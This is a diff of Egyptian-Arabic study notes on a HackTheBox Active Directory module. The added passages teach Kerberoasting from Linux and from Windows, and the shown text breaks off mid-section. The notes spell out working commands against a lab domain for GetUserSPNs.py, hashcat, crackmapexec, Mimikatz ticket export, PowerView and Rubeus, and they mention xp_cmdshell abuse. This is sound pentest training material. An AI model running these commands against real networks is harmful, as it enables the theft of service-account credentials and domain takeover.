@@ -17658,7 +17658,7 @@ console        forend      1     Active
 
 ---
 
-# 7. `arp -a`
+## 7. `arp -a`
 
 ```cmd
 arp -a
@@ -17684,7 +17684,7 @@ arp -a
 
 ---
 
-# 8. `route print`
+## 8. `route print`
 
 ```cmd
 route print
@@ -17709,7 +17709,7 @@ HTB بيشير إن routing information ممكن تكشف network segments إض�
 
 ---
 
-# 9. WMI
+## 9. WMI
 
 WMI = **Windows Management Instrumentation**
 
@@ -17749,7 +17749,7 @@ wmic ntdomain list /format:list
 
 ---
 
-# 10. Net Commands
+## 10. Net Commands
 
 دي من أهم أجزاء الـmodule.
 
@@ -17807,7 +17807,7 @@ net view /all /domain
 
 ---
 
-# 11. نقطة مهمة جدًا: `net1`
+## 11. نقطة مهمة جدًا: `net1`
 
 الـmodule بيشرح إن:
 
@@ -17825,7 +17825,7 @@ net1
 
 ---
 
-# 12. Dsquery
+## 12. Dsquery
 
 وده من أهم الأدوات في الجزء ده.
 
@@ -17853,7 +17853,7 @@ dsquery computer
 
 ---
 
-# 13. LDAP Filters
+## 13. LDAP Filters
 
 هنا الجزء اللي لازم تفهمه كويس، مش تحفظه.
 
@@ -17905,7 +17905,7 @@ Any matching bit.
 
 ---
 
-# 14. Logical Operators
+## 14. Logical Operators
 
 تقدر تعمل filters مركبة.
 
@@ -17985,3 +17985,2223 @@ LDAP Filters
 **لو مفيش SharpHound، PowerView، Snaffler، أو Internet → لسه عندك Windows نفسه كـenumeration toolkit.**
 
 وده بالضبط سبب إن الجزء ده جه بعد Credentialed Enumeration وقبل **Kerberoasting**.
+
+
+# Layer 17
+## Kerberoasting من Linux — شرح بالمصري
+
+الفكرة كلها في الأول:
+
+**إحنا عندنا Domain User عادي → ندور على Service Accounts عليها SPN → نطلب TGS Ticket ليها → ناخد الـ Ticket ونكسره Offline → لو الباسورد اتكسر، نستخدم الـ credentials بتاعتها حسب صلاحيات الحساب.**
+
+خلينا نفك كل جزء.
+
+---
+
+## 1. يعني إيه SPN؟
+
+**SPN = Service Principal Name**
+
+ده اسم بيستخدمه **Kerberos** عشان يعرف:
+
+> الخدمة دي شغالة تحت أنهي Account؟
+
+مثلاً:
+
+```text
+MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
+```
+
+معناه تقريبًا:
+
+```text
+MSSQLSvc       → نوع الخدمة SQL Server
+DEV-PRE-SQL    → السيرفر
+1433           → Port
+```
+
+والـ SPN ده ممكن يكون مربوط بـ User اسمه:
+
+```text
+sqldev
+```
+
+يعني:
+
+```text
+sqldev
+   ↓
+MSSQL Service
+   ↓
+DEV-PRE-SQL:1433
+```
+
+---
+
+## 2. ليه Service Account بيكون User أصلاً؟
+
+ممكن تقول:
+
+> ليه SQL Server مثلاً محتاج User Account؟
+
+لأن الخدمات في Windows ممكن تشتغل تحت حساب معين.
+
+مثلاً:
+
+```text
+SQL Server
+    ↓
+sqldev
+```
+
+فالـ SQL Server بياخد صلاحيات `sqldev`.
+
+المشكلة إن الـ admins أحيانًا بيدوا Service Accounts صلاحيات كبيرة جدًا.
+
+مثلاً:
+
+```text
+sqldev
+   ↓
+Domain Admins
+```
+
+وده طبعًا خطر جدًا.
+
+---
+
+## 3. فين ثغرة Kerberoasting؟
+
+أهم نقطة في الموضوع:
+
+**أي Domain User authenticated يقدر يطلب TGS لأي Service Account عنده SPN.**
+
+يعني لو إحنا معانا:
+
+```text
+forend
+```
+
+وهو User عادي في الدومين، نقدر نقول للـ Domain Controller:
+
+> اديني TGS للخدمة اللي شغالة تحت `sqldev`.
+
+والـ DC هيطلعهولنا.
+
+وده مش معناه إننا بقينا `sqldev`.
+
+دي نقطة مهمة جدًا.
+
+---
+
+## 4. طب الـ TGS فيه إيه؟
+
+الـ TGS = **Ticket Granting Service ticket**
+
+الـ Ticket نفسه متشفّر باستخدام secret مرتبط بحساب الخدمة، وهنا تحديدًا الـ **NTLM hash بتاع Service Account** في حالة RC4/etype 23.
+
+بالتالي عندنا حاجة بالشكل ده:
+
+```text
+TGS
+ ↓
+Encrypted باستخدام secret بتاع sqldev
+```
+
+إحنا مش بنفك تشفير الـ TGS مباشرة.
+
+لكن نقدر نعمل:
+
+```text
+TGS
+ ↓
+Offline password cracking
+ ↓
+Password
+```
+
+وده هو **Kerberoasting**.
+
+---
+
+## 5. ليه Offline؟
+
+دي من أهم مميزات الهجوم.
+
+إحنا بعد ما ناخد الـ TGS:
+
+```text
+DC
+ ↓
+TGS
+ ↓
+جهازنا
+```
+
+مش محتاجين نفضل نطلب Password guesses من الـ DC.
+
+بدل كده:
+
+```text
+TGS
+ ↓
+Hashcat
+ ↓
+password guesses محليًا
+```
+
+يعني الـ Domain Controller مش شايف ملايين محاولات الباسورد.
+
+وده بيخلي الهجوم أخطر.
+
+---
+
+## 6. إيه المطلوب عشان أعمل Kerberoasting؟
+
+واحد من دول:
+
+### الحالة الأشهر
+
+Credentials بتاعت Domain User:
+
+```text
+domain/user:password
+```
+
+### أو
+
+NTLM hash بتاع Domain User.
+
+### أو
+
+Shell شغال بالفعل كـ Domain User.
+
+### أو
+
+SYSTEM على جهاز Domain-Joined.
+
+وكمان محتاج تعرف الـ **Domain Controller**.
+
+مثلاً:
+
+```text
+DC = 172.16.5.5
+Domain = INLANEFREIGHT.LOCAL
+```
+
+---
+
+## 7. ليه Service Accounts خطيرة؟
+
+لأنها أحيانًا بتكون واخدة صلاحيات زيادة.
+
+مثلاً:
+
+```text
+sqldev
+ ├── SPN
+ ├── SQL Server service
+ └── Domain Admins
+```
+
+لو قدرنا نكسر Password بتاع `sqldev`:
+
+```text
+sqldev
+   ↓
+database!
+   ↓
+Domain Admin
+   ↓
+Domain Compromise
+```
+
+وده سبب إننا بنبص على **MemberOf** لما نعمل enumeration.
+
+---
+
+## 8. هل مجرد وجود SPN معناه إننا اتخترقنا؟
+
+**لا.**
+
+دي نقطة الكتاب مركز عليها.
+
+وجود:
+
+```text
+SPN
+```
+
+مش معناه:
+
+```text
+Domain Admin
+```
+
+إحنا لسه محتاجين:
+
+```text
+SPN
+ ↓
+TGS
+ ↓
+Crack
+ ↓
+Password
+ ↓
+Check privileges
+```
+
+وممكن الباسورد **مايتكسرش أصلاً**.
+
+---
+
+## 9. تثبيت Impacket
+
+الكتاب بيستخدم:
+
+```text
+Impacket
+```
+
+وهي مجموعة أدوات Python مشهورة جدًا في Active Directory pentesting.
+
+بعد تثبيتها، هتلاقي أدوات زي:
+
+```text
+GetUserSPNs.py
+```
+
+والأداة دي تحديدًا هي اللي هنستخدمها في Kerberoasting.
+
+---
+
+## 10. GetUserSPNs.py بتعمل إيه؟
+
+اسمها واضح:
+
+```text
+GetUserSPNs.py
+```
+
+بتسأل الـ Domain:
+
+> إيه الـ Users اللي عندهم SPNs؟
+
+يعني بدل ما إحنا نعرف الحسابات يدويًا، الأداة تعمل enumeration.
+
+---
+
+## 11. الأمر الأول
+
+```bash
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
+```
+
+نفككه:
+
+### `GetUserSPNs.py`
+
+الأداة.
+
+### `-dc-ip 172.16.5.5`
+
+قول للأداة:
+
+> الـ Domain Controller موجود على الـ IP ده.
+
+### `INLANEFREIGHT.LOCAL/forend`
+
+يعني:
+
+```text
+Domain = INLANEFREIGHT.LOCAL
+User   = forend
+```
+
+بعدها هتطلب:
+
+```text
+Password:
+```
+
+---
+
+## 12. النتيجة
+
+هتطلع حاجة زي:
+
+```text
+ServicePrincipalName
+Name
+MemberOf
+PasswordLastSet
+LastLogon
+Delegation
+```
+
+أهم 3 بالنسبة لنا:
+
+### ServicePrincipalName
+
+الخدمة:
+
+```text
+MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
+```
+
+### Name
+
+الحساب:
+
+```text
+sqldev
+```
+
+### MemberOf
+
+صلاحيات الحساب:
+
+```text
+Domain Admins
+```
+
+وده أهم جزء.
+
+لأننا لو لقينا:
+
+```text
+sqldev → Domain Admins
+```
+
+فده Target مهم جدًا.
+
+---
+
+## 13. مثال الـ output
+
+عندنا:
+
+```text
+MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
+sqldev
+Domain Admins
+```
+
+معناه:
+
+```text
+SQL Service
+     ↓
+شغالة بحساب sqldev
+     ↓
+sqldev عضو في Domain Admins
+```
+
+فلو قدرنا نطلع Password بتاع `sqldev`:
+
+```text
+Domain Admin credentials
+```
+
+---
+
+## 14. طلب الـ TGS
+
+بدل ما نعمل enumeration بس، نضيف:
+
+```bash
+-request
+```
+
+فيبقى:
+
+```bash
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
+```
+
+الفرق:
+
+بدون `-request`:
+
+```text
+هاتلي SPNs
+```
+
+مع `-request`:
+
+```text
+هاتلي SPNs
++
+اطلب TGS لكل Service Account
+```
+
+---
+
+## 15. ليه الـ output طويل جدًا؟
+
+لأن الـ TGS نفسه بيطلع في صيغة زي:
+
+```text
+$krb5tgs$23$*sqldev$...
+```
+
+ده مش Password.
+
+ده **Kerberos TGS hash/cracking representation**.
+
+بنحطه في أداة cracking.
+
+---
+
+## 16. ليه `$krb5tgs$23$`؟
+
+الجزء ده بيوصف نوع الـ Kerberos ticket/hash format.
+
+```text
+krb5tgs
+```
+
+يعني Kerberos TGS.
+
+```text
+23
+```
+
+يعني **RC4-HMAC / etype 23**.
+
+وده النوع اللي Hashcat بيستخدم له:
+
+```text
+-m 13100
+```
+
+---
+
+## 17. ممكن أطلب Ticket لحساب واحد بس؟
+
+آه.
+
+بدل:
+
+```bash
+-request
+```
+
+نستخدم:
+
+```bash
+-request-user sqldev
+```
+
+مثلاً:
+
+```bash
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
+```
+
+ده معناه:
+
+> أنا مهتم بـ `sqldev` بس، اديني الـ TGS بتاعه.
+
+وده مفيد لما تكون عملت enumeration ولقيت Account مهم.
+
+---
+
+## 18. ليه نعمل Account واحد بدل كل الحسابات؟
+
+عشان ممكن تكون لقيت:
+
+```text
+backupagent → Domain Admins
+solarwinds → Domain Admins
+sqldev → Domain Admins
+```
+
+ومحتاج تختبر واحد معين.
+
+بدل ما تطلع Tickets لكل حاجة:
+
+```text
+-request-user sqldev
+```
+
+---
+
+## 19. نحفظ الـ Ticket في File
+
+ممكن نستخدم:
+
+```bash
+-outputfile sqldev_tgs
+```
+
+مثلاً:
+
+```bash
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend \
+-request-user sqldev \
+-outputfile sqldev_tgs
+```
+
+دلوقتي:
+
+```text
+sqldev_tgs
+```
+
+فيه الـ TGS.
+
+ليه نحفظه؟
+
+عشان نديه لـ Hashcat.
+
+---
+
+## 20. دلوقتي جه دور Hashcat
+
+الأمر:
+
+```bash
+hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
+```
+
+نفككه:
+
+### `hashcat`
+
+أداة password cracking.
+
+### `-m 13100`
+
+Hashcat mode الخاص بـ:
+
+```text
+Kerberos 5 TGS-REP
+etype 23
+```
+
+### `sqldev_tgs`
+
+الـ Ticket اللي إحنا طلعناه.
+
+### `rockyou.txt`
+
+Wordlist فيها كلمات مرور شائعة.
+
+---
+
+## 21. Hashcat بيعمل إيه هنا؟
+
+ببساطة:
+
+عنده:
+
+```text
+TGS
+```
+
+وعنده candidates:
+
+```text
+password123
+database!
+admin123
+...
+```
+
+يجرب كل Password ويشوف:
+
+> هل الـ Password دي تقدر تنتج الـ secret اللي يتوافق مع الـ TGS؟
+
+لو آه:
+
+```text
+CRACKED
+```
+
+---
+
+## 22. وفي المثال الباسورد اتكسر
+
+النتيجة كانت:
+
+```text
+database!
+```
+
+يعني:
+
+```text
+sqldev : database!
+```
+
+إحنا كده انتقلنا من:
+
+```text
+TGS
+```
+
+إلى:
+
+```text
+Cleartext password
+```
+
+وده الهدف الأساسي من Kerberoasting.
+
+---
+
+## 23. هل كده بقينا Domain Admin؟
+
+لسه لازم **نتأكد**.
+
+إحنا عرفنا من الـ enumeration إن:
+
+```text
+sqldev → Domain Admins
+```
+
+فالمفروض credentials دي تدي صلاحيات Domain Admin.
+
+لكن في الـ pentest بنعمل validation.
+
+مثلاً:
+
+```bash
+crackmapexec smb 172.16.5.5 -u sqldev -p database!
+```
+
+والنتيجة:
+
+```text
+[+] INLANEFREIGHT.LOCAL\sqldev:database! (Pwn3d!)
+```
+
+معناها إن الـ credentials اشتغلت على الـ DC، والـ account عنده صلاحيات قوية جدًا.
+
+---
+
+## 24. الصورة كلها في Flow واحد
+
+احفظها بالشكل ده:
+
+```text
+Domain User
+     │
+     ▼
+Enumerate SPNs
+     │
+     ▼
+Find Service Account
+     │
+     ▼
+Request TGS
+     │
+     ▼
+Save TGS
+     │
+     ▼
+Hashcat / Offline Cracking
+     │
+     ▼
+Password
+     │
+     ▼
+Check Account Privileges
+     │
+     ▼
+Lateral Movement / Privilege Escalation
+```
+
+ولو الحساب:
+
+```text
+Service Account
+       +
+SPN
+       +
+Weak Password
+       +
+High Privileges
+```
+
+يبقى Kerberoasting ممكن يبقى خطير جدًا.
+
+---
+
+## 25. طب لو الباسورد قوي؟
+
+ساعتها ممكن يحصل:
+
+```text
+SPN found
+   ↓
+TGS obtained
+   ↓
+Hashcat
+   ↓
+Nothing
+```
+
+وده طبيعي.
+
+**Kerberoasting مش معناه إنك هتكسر الباسورد.**
+
+الهجوم بيعتمد جدًا على قوة Password بتاعة Service Account.
+
+---
+
+## 26. ليه Service Accounts بالذات معرضة؟
+
+لأن الـ admins ممكن يعملوا حاجات زي:
+
+```text
+Password طويل؟ لا
+Password عشوائي؟ لا
+Password rotation؟ نادر
+Password reused؟ ممكن
+```
+
+وأحيانًا بشكل سيئ جدًا:
+
+```text
+username = sqldev
+password = sqldev
+```
+
+أو Password سهلة التخمين.
+
+وده بيخلي الـ TGS قابل للكسر Offline.
+
+---
+
+## 27. طب لو الحساب اللي اتكسر Low Privilege؟
+
+برضه مش بالضرورة بلا قيمة.
+
+مثلاً:
+
+```text
+sqldev
+```
+
+مش Domain Admin.
+
+لكن عنده SQL Server privileges قوية.
+
+أو ممكن يكون Local Admin على Servers كتير.
+
+فممكن نستخدم credentials في:
+
+```text
+Lateral Movement
+```
+
+وبالتالي:
+
+```text
+Server A
+   ↓
+Server B
+   ↓
+Domain escalation
+```
+
+---
+
+## 28. مثال SQL اللي الكتاب ذكره
+
+لو الـ SPN:
+
+```text
+MSSQL/SRV01
+```
+
+والـ account عنده صلاحيات SQL عالية، ممكن credentials تسمح لنا بالدخول على SQL Server بصلاحيات قوية.
+
+وفي سيناريوهات معينة، لو عندنا `sysadmin` على SQL Server، ممكن إساءة استخدام:
+
+```text
+xp_cmdshell
+```
+
+لتنفيذ أوامر على الجهاز.
+
+فمش لازم الحساب نفسه يكون Domain Admin عشان يكون مفيد.
+
+---
+
+## 29. هل Kerberoasting شغال من Linux بس؟
+
+لا.
+
+ممكن من:
+
+```text
+Linux غير Domain-Joined
+```
+
+باستخدام credentials.
+
+أو:
+
+```text
+Linux Domain-Joined
+```
+
+بـ keytab.
+
+أو:
+
+```text
+Windows Domain-Joined
+```
+
+وأنت authenticated كـ Domain User.
+
+أو باستخدام أدوات Windows زي:
+
+```text
+Rubeus
+PowerView
+Mimikatz
+setspn.exe
+```
+
+الفكرة واحدة، الأدوات هي اللي بتختلف.
+
+---
+
+## 30. نقطة مهمة جدًا: Kerberoasting ≠ AS-REP Roasting
+
+الاتنين بيتلخبطوا.
+
+### Kerberoasting
+
+بنستهدف:
+
+```text
+Service Accounts
++
+SPN
+```
+
+وبنطلب:
+
+```text
+TGS
+```
+
+### AS-REP Roasting
+
+بنستهدف Users عندهم:
+
+```text
+Do not require Kerberos preauthentication
+```
+
+والـ material اللي بناخده مختلف.
+
+فافتكر:
+
+```text
+SPN → Kerberoasting → TGS
+```
+
+---
+
+## 31. ليه الكتاب بيقول Lateral Movement / Privilege Escalation؟
+
+لأن النتيجة ممكن تختلف.
+
+لو الحساب:
+
+```text
+User A
+   ↓
+Kerberoast
+   ↓
+Service Account
+   ↓
+Local Admin on Server B
+```
+
+ده **Lateral Movement**.
+
+أما:
+
+```text
+User A
+   ↓
+Kerberoast
+   ↓
+Domain Admin
+```
+
+ده **Privilege Escalation / Domain Compromise**.
+
+---
+
+## 32. آخر جزء: تقييم الخطورة
+
+الكتاب بيقول حاجة مهمة جدًا في الـ Pentest Report.
+
+مش كل Kerberoasting finding نفس الخطورة.
+
+### الحالة الأولى
+
+كسرنا Ticket وطلع:
+
+```text
+Domain Admin
+```
+
+ده تأثيره كبير جدًا.
+
+### الحالة الثانية
+
+كسرنا Account مهم وده ساعدنا نوصل للـ Domain.
+
+برضه تأثيره كبير.
+
+### الحالة الثالثة
+
+طلعنا Tickets لكن:
+
+```text
+ولا Ticket اتكسر
+```
+
+هنا الـ risk أقل من الحالات السابقة، لأننا أثبتنا وجود الـ weakness لكن **ماقدرناش نثبت compromise فعلي للحسابات**.
+
+وده فرق مهم في الـ Reporting:
+
+> **وجود attack path ≠ إثبات impact بنفس الدرجة.**
+
+---
+
+## الخلاصة اللي تحفظها
+
+لو في HTB سألك: **Kerberoasting بيشتغل إزاي؟**
+
+جاوب في دماغك:
+
+```text
+1. عندي Domain User
+2. أعمل Enumeration للـ SPNs
+3. ألاقي Service Account
+4. أشوف صلاحيات الحساب
+5. أطلب TGS
+6. آخد الـ TGS hash
+7. أعمل Offline Cracking
+8. لو Password اتكسرت:
+      أستخدم credentials
+9. أتحقق من صلاحيات الحساب
+10. أشوف هل وصلت لـ Local Admin / SQL Admin / Domain Admin
+```
+
+وأهم 4 حاجات في الدرس:
+
+```text
+SPN
+ ↓
+TGS
+ ↓
+Offline Cracking
+ ↓
+Service Account Credentials
+```
+
+**ودي بالظبط الفكرة اللي محتاج تكون فاهمها قبل ما تدخل الجزء بتاع Kerberoasting من Windows.**
+
+
+# Layer 18
+تمام. الجزء ده بيكمل **Kerberoasting من Windows**، والـ main idea فيه إننا بنعمل نفس الهجوم اللي شرحناه من Linux، لكن بدل `GetUserSPNs.py` بنستخدم أدوات Windows، بدايةً من الطريقة اليدوية لحد `PowerView` و`Rubeus`.
+
+## 1. الـ Semi-Manual Method
+
+الفكرة العامة:
+
+```text
+Enumerate SPNs
+      ↓
+اختار Service Account
+      ↓
+Request TGS
+      ↓
+TGS يتحط في Memory
+      ↓
+Mimikatz يستخرج الـ Ticket
+      ↓
+.kirbi
+      ↓
+Convert to Hashcat format
+      ↓
+Hashcat
+      ↓
+Password
+```
+
+يعني نفس Kerberoasting، بس Windows-native.
+
+---
+
+## 2. أول خطوة: Enumerate الـ SPNs بـ `setspn`
+
+```cmd
+setspn.exe -Q */*
+```
+
+`setspn`
+أداة Windows built-in للتعامل مع الـ SPNs.
+
+### يعني إيه `-Q */*`؟
+
+معناها تقريبًا:
+
+> Query عن كل الـ SPNs الموجودة.
+
+فتطلع حاجات زي:
+
+```text
+CN=sqlprod,...
+    MSSQLSvc/SPSJDB.inlanefreight.local:1433
+
+CN=sqldev,...
+    MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
+```
+
+المهم هنا إننا نربط:
+
+```text
+SPN
+ ↓
+Account
+```
+
+مثلاً:
+
+```text
+MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
+                ↓
+              sqldev
+```
+
+وده معناه إن `sqldev` هو الـ account اللي الـ SQL service شغالة بيه.
+
+### ليه بنركز على User Accounts؟
+
+لأن الـ output ممكن يحتوي:
+
+```text
+Computer Accounts
+User/Service Accounts
+```
+
+إحنا مهتمين بالـ service accounts، لأننا عايزين TGS يكون مشفّر بالـ secret الخاص بحساب service، وبعدها نحاول crack الـ TGS.
+
+---
+
+## 3. طلب TGS يدويًا بـ PowerShell
+
+بعد ما لقينا:
+
+```text
+MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
+```
+
+نقدر نطلب TGS له:
+
+```powershell
+Add-Type -AssemblyName System.IdentityModel
+
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken `
+-ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
+```
+
+خلينا نفهمها واحدة واحدة.
+
+### `Add-Type`
+
+```powershell
+Add-Type -AssemblyName System.IdentityModel
+```
+
+بيحمّل .NET Assembly في PowerShell.
+
+يعني بنقول لـ PowerShell:
+
+> أنا محتاج الـ classes الموجودة في `System.IdentityModel`.
+
+---
+
+### `New-Object`
+
+```powershell
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken
+```
+
+ده بيعمل object من الـ .NET class:
+
+```text
+KerberosRequestorSecurityToken
+```
+
+والـ class دي مسؤولة عن طلب Kerberos security token.
+
+---
+
+### الـ SPN
+
+```text
+MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
+```
+
+بنبعته للـ class، فيتم طلب:
+
+```text
+TGS
+```
+
+للـ service دي.
+
+والـ output بيقول:
+
+```text
+ServicePrincipalName :
+MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
+```
+
+يعني الـ TGS اتطلب للـ SPN اللي إحنا حددناه.
+
+---
+
+## 4. طب الـ TGS راح فين؟
+
+النقطة المهمة جدًا:
+
+الـ TGS اتخزن في:
+
+```text
+Memory
+```
+
+مش ملف عندنا.
+
+عشان كده بنستخدم:
+
+```text
+Mimikatz
+```
+
+عشان نستخرج الـ Kerberos tickets من الـ memory.
+
+---
+
+## 5. طلب Tickets لكل الـ SPNs
+
+بدل ما نحدد SPN واحد:
+
+```powershell
+New-Object ...KerberosRequestorSecurityToken ...
+```
+
+المثال بيستخدم:
+
+```powershell
+setspn.exe -T INLANEFREIGHT.LOCAL -Q */*
+```
+
+عشان يجيب الـ SPNs.
+
+وبعدين:
+
+```powershell
+Select-String '^CN'
+```
+
+و:
+
+```powershell
+% { New-Object ... }
+```
+
+بحيث كل SPN يتم استخدامه لطلب TGS.
+
+يعني ببساطة:
+
+```text
+setspn
+ ↓
+جيب SPNs
+ ↓
+مرر كل SPN
+ ↓
+Request TGS
+ ↓
+Tickets في Memory
+```
+
+لكن المشكلة:
+
+> هتجيب Computer Accounts كمان.
+
+عشان كده الطريقة دي مش efficient قوي.
+
+---
+
+## 6. استخراج الـ Tickets بـ Mimikatz
+
+الأمر:
+
+```text
+mimikatz # kerberos::list /export
+```
+
+معناه:
+
+> List Kerberos tickets الموجودة في الـ memory وexportها.
+
+هتلاقي مثلاً:
+
+```text
+Server Name :
+MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
+
+Client Name :
+htb-student
+```
+
+وده مهم جدًا.
+
+### Server Name
+
+هو الـ service اللي طلبنا لها TGS:
+
+```text
+MSSQLSvc/DEV-PRE-SQL...
+```
+
+### Client Name
+
+مين اللي طلب الـ ticket:
+
+```text
+htb-student
+```
+
+---
+
+## 7. `rc4_hmac_nt`
+
+في الـ output:
+
+```text
+0x00000017 - rc4_hmac_nt
+```
+
+الـ:
+
+```text
+0x17
+```
+
+يساوي:
+
+```text
+23 decimal
+```
+
+وده:
+
+```text
+RC4-HMAC
+```
+
+وده سبب إن Hashcat بعد كده يستخدم:
+
+```text
+-m 13100
+```
+
+لـ:
+
+```text
+Kerberos 5, etype 23, TGS-REP
+```
+
+---
+
+## 8. إيه هو `.kirbi`؟
+
+Mimikatz ممكن يطلع الـ ticket كملف:
+
+```text
+something.kirbi
+```
+
+الـ `.kirbi` ببساطة هو **ملف يحتوي Kerberos ticket**.
+
+عندك طريقتين:
+
+### الطريقة الأولى
+
+Mimikatz يكتب `.kirbi` مباشرة:
+
+```text
+kerberos::list /export
+```
+
+### الطريقة الثانية
+
+نستخدم:
+
+```text
+base64 /out:true
+```
+
+فيطلع الـ ticket كـ Base64.
+
+وده اللي بيحصل في المثال.
+
+---
+
+## 9. ليه Base64؟
+
+الـ Base64 هنا مجرد **طريقة لتمثيل الـ binary ticket كنص**.
+
+يعني:
+
+```text
+Kerberos ticket binary
+        ↓
+      Base64
+        ↓
+    نص تقدر تنقله
+```
+
+لكن Hashcat مش هيشتغل على الـ Base64 مباشرة.
+
+عشان كده بنرجعه تاني لـ `.kirbi`.
+
+---
+
+## 10. إزالة الـ Newlines
+
+Mimikatz بيقسم الـ Base64 على كذا سطر.
+
+لكن محتاجينه:
+
+```text
+single line
+```
+
+عشان كده:
+
+```bash
+echo "<base64 blob>" | tr -d \n
+```
+
+بتشيل الـ newline.
+
+---
+
+## 11. تحويل Base64 إلى `.kirbi`
+
+```bash
+cat encoded_file | base64 -d > sqldev.kirbi
+```
+
+يعني:
+
+```text
+Base64
+ ↓ decode
+Binary ticket
+ ↓
+sqldev.kirbi
+```
+
+---
+
+## 12. `kirbi2john.py`
+
+دلوقتي عندنا:
+
+```text
+sqldev.kirbi
+```
+
+لكن Hashcat مش عايز `.kirbi`.
+
+فبنستخدم:
+
+```bash
+python2.7 kirbi2john.py sqldev.kirbi
+```
+
+الأداة تستخرج الجزء المطلوب من الـ Kerberos ticket وتحوله لصيغة أقرب للـ cracking.
+
+ويطلع:
+
+```text
+crack_file
+```
+
+---
+
+## 13. تعديل الـ Hash Format
+
+المثال يستخدم:
+
+```bash
+sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
+```
+
+الفكرة مش إنك تحفظ الـ regex حرفيًا دلوقتي.
+
+المهم تفهم إننا بنحوّل الناتج إلى format يفهمه Hashcat:
+
+```text
+$krb5tgs$23$...
+```
+
+والـ `23` هنا:
+
+```text
+Kerberos etype 23
+=
+RC4-HMAC
+```
+
+---
+
+## 14. Hashcat
+
+بعد كده:
+
+```bash
+hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
+```
+
+يعني:
+
+```text
+-m 13100
+```
+
+اختار Kerberos TGS-REP RC4.
+
+والـ wordlist:
+
+```text
+rockyou.txt
+```
+
+وفي المثال النتيجة:
+
+```text
+database!
+```
+
+إذن:
+
+```text
+TGS
+ ↓
+Extract
+ ↓
+Hashcat
+ ↓
+database!
+```
+
+---
+
+## 15. الطريقة اليدوية vs Linux
+
+الفرق الأساسي:
+
+### Linux
+
+```text
+GetUserSPNs.py
+ ↓
+TGS
+ ↓
+Hashcat
+```
+
+### Windows manual
+
+```text
+setspn
+ ↓
+PowerShell
+ ↓
+TGS في Memory
+ ↓
+Mimikatz
+ ↓
+.kirbi
+ ↓
+kirbi2john
+ ↓
+Hashcat
+```
+
+عشان كده Linux method أسهل بكتير.
+
+---
+
+## 16. PowerView — الطريقة الأسرع
+
+بدل كل الخطوات دي، نستخدم:
+
+```powershell
+Import-Module .\PowerView.ps1
+```
+
+وبعدين:
+
+```powershell
+Get-DomainUser * -spn | select samaccountname
+```
+
+النتيجة مثلًا:
+
+```text
+adfs
+backupagent
+krbtgt
+sqldev
+sqlprod
+sqlqa
+solarwindsmonitor
+```
+
+دي الحسابات اللي عندها:
+
+```text
+SPN
+```
+
+يعني Kerberoastable accounts.
+
+---
+
+## 17. طلب TGS وتحويله Hashcat Format مباشرة
+
+بدل:
+
+```text
+Request TGS
+ ↓
+Mimikatz
+ ↓
+.kirbi
+ ↓
+kirbi2john
+ ↓
+sed
+```
+
+PowerView يعملها تقريبًا في خطوة واحدة:
+
+```powershell
+Get-DomainUser -Identity sqldev |
+Get-DomainSPNTicket -Format Hashcat
+```
+svc_vmwaresso
+فتاخد مباشرة:
+
+```text
+Hash : $krb5tgs$23$...
+```
+
+وده جاهز لـ Hashcat.
+
+وده سبب إن PowerView أسرع بكتير من الـ manual method.
+
+---
+
+## 18. تصدير كل الـ TGS إلى CSV
+
+```powershell
+Get-DomainUser * -SPN |
+Get-DomainSPNTicket -Format Hashcat |
+Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
+```
+
+الفكرة:
+
+```text
+كل Service Accounts
+        ↓
+Request TGS
+        ↓
+Convert Hashcat format
+        ↓
+CSV
+```
+
+وبالتالي تقدر تنقل الـ CSV للـ attack machine وتعمل cracking offline.
+
+---
+
+## 19. Rubeus
+
+وده أهم Tool في الجزء ده.
+
+بدل ما تعمل كل الكلام السابق،:
+
+```powershell
+.\Rubeus.exe kerberoast
+```
+
+Rubeus يعمل معظم العملية تلقائيًا.
+
+---
+
+## أهم خيارات Rubeus
+
+### كل الـ Kerberoastable Accounts
+
+```powershell
+Rubeus.exe kerberoast
+```
+
+---
+
+### User معين
+
+```powershell
+Rubeus.exe kerberoast /user:sqldev
+```
+
+يعني:
+
+> اعمل Kerberoast للـ `sqldev` فقط.
+
+---
+
+### SPN معين
+
+```text
+/spn:"MSSQLSvc/..."
+```
+
+---
+
+### حفظ الـ hashes
+
+```text
+/outfile:hashes.txt
+```
+
+---
+
+### بدون wrapping
+
+```text
+/nowrap
+```
+
+ودي مهمة جدًا.
+
+بدل ما الـ hash يطلع:
+
+```text
+$krb5tgs$23$....
+............
+............
+```
+
+يطلع كله في سطر واحد.
+
+وده يسهل جدًا نسخه لـ Hashcat.
+
+---
+
+## 20. `/stats` مهم جدًا
+
+```powershell
+Rubeus.exe kerberoast /stats
+```
+
+الميزة هنا:
+
+> يعمل enumeration وتحليل، **من غير ما يطلب TGS tickets**.
+
+المثال وجد:
+
+```text
+Total kerberoastable users : 9
+```
+
+ومنهم:
+
+```text
+RC4 : 7
+AES : 2
+```
+
+وكمان:
+
+```text
+Password Last Set Year
+2022 : 9
+```
+
+فأنت قبل ما تبدأ تطلب tickets ممكن تعرف:
+
+```text
+كام account؟
+أنواع encryption؟
+إمتى passwords اتغيرت؟
+```
+
+---
+
+## 21. ليه `PwdLastSet` مهم؟
+
+لو لقيت Service Account:
+
